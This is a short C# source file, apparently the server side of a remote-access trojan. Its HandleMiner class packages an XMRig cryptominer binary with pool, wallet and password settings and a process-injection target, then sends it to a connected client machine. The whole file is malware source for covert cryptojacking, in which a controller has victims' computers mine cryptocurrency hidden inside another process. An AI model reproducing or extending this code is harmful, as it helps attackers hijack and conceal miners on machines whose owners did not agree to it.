using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Server.Handle_Packet
{
   public class HandleMiner
    {
        public void SendMiner(Clients client)
        {
            MsgPack packet = new MsgPack();
            packet.ForcePathObject("Packet").AsString = "xmr";
            packet.ForcePathObject("Command").AsString = "save";
            packet.ForcePathObject("Bin").SetAsBytes(Zip.Compress(File.ReadAllBytes(@"Plugins\xmrig.bin")));
            packet.ForcePathObject("Hash").AsString = GetHash.GetChecksum(@"Plugins\xmrig.bin");
            packet.ForcePathObject("Pool").AsString = XmrSettings.Pool;
            packet.ForcePathObject("Wallet").AsString = XmrSettings.Wallet;
            packet.ForcePathObject("Pass").AsString = XmrSettings.Pass;
            packet.ForcePathObject("InjectTo").AsString = XmrSettings.InjectTo;
            ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
            Debug.WriteLine("XMR sent");
        }
    }
}
